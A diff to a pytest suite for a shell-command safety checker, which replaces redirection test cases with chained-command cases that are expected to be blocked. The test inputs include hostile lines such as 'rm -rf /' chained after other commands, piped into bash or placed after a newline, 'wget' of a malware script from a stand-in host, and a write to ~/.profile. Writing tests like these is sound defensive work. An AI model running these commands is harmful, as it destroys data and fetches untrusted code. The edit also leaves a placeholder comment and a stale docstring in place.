@@ -88,12 +88,15 @@ class TestSecurityGuardComprehensive:
         assert is_safe is True, f"Safe redirection blocked: {reason}"
 
     @pytest.mark.parametrize("command", [
-        "echo 'hacked' > /etc/hosts",
-        "cat secrets.txt >> ~/.bashrc",
-        "echo 'bad' > ../../../windows/system32/bad.dll",
-        "ls -la > /"
+        "echo 'hello' && rm -rf /",
+        "ls || curl http://bad.com",
+        "pwd ; wget http://bad.com/malware.sh",
+        "echo 'safe' | bash -c 'rm -rf /'", 
+        "cd my_dir && echo 'hacked' > ~/.profile",
+        "echo 'sneaky'\nrm -rf /",   
     ])
-    def test_malicious_redirection_blocked(self, command):
+    def test_chained_malicious_commands_blocked(self, command):
+        # ... (Keep existing test logic) ...
         """Ensures redirection cannot write to absolute paths, home dirs, or traverse up."""
         is_safe, reason = check_command_safety(command)
         assert is_safe is False
